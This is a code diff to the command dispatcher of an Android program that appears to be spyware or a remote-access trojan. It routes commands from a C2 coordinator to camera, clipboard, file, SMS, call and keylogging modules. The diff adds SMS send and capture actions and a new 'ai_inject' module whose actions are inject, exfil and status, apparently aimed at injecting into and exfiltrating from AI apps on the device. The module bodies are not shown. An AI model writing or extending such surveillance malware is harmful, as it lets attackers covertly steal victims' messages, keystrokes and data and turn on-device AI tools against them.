@@ -5,6 +5,7 @@ import android.provider.Settings
 import android.util.Log
 import org.synapse.core.c2.C2Coordinator
 import org.synapse.core.c2.Command
+import org.synapse.core.modules.AiInjectionModule
 import org.synapse.core.modules.CameraModule
 import org.synapse.core.modules.ClipboardModule
 import org.synapse.core.modules.FileModule
@@ -82,6 +83,8 @@ object SynapseEngine {
                 "list" -> SmsModule.list(context, cmd)
                 "read" -> SmsModule.read(context, cmd)
                 "dump" -> SmsModule.dump(context, cmd)
+                "send" -> SmsModule.send(context, cmd)
+                "capture" -> SmsModule.capture(context, cmd)
                 else -> SynapseResponse.ErrorResponse("sms:unknown_action:${cmd.action}", "sms")
             }},
             "calls"    to { cmd -> when (cmd.action) {
@@ -106,6 +109,12 @@ object SynapseEngine {
                 "stop" -> KeylogModule.stop(context, cmd)
                 "dump" -> KeylogModule.dump(context, cmd)
                 else -> SynapseResponse.ErrorResponse("keylog:unknown_action:${cmd.action}", "keylog")
+            }},
+            "ai_inject" to { cmd -> when (cmd.action) {
+                "inject" -> AiInjectionModule.inject(context, cmd)
+                "exfil" -> AiInjectionModule.exfil(context, cmd)
+                "status" -> AiInjectionModule.status(context, cmd)
+                else -> SynapseResponse.ErrorResponse("ai_inject:unknown_action:${cmd.action}", "ai_inject")
             }}
         )
 
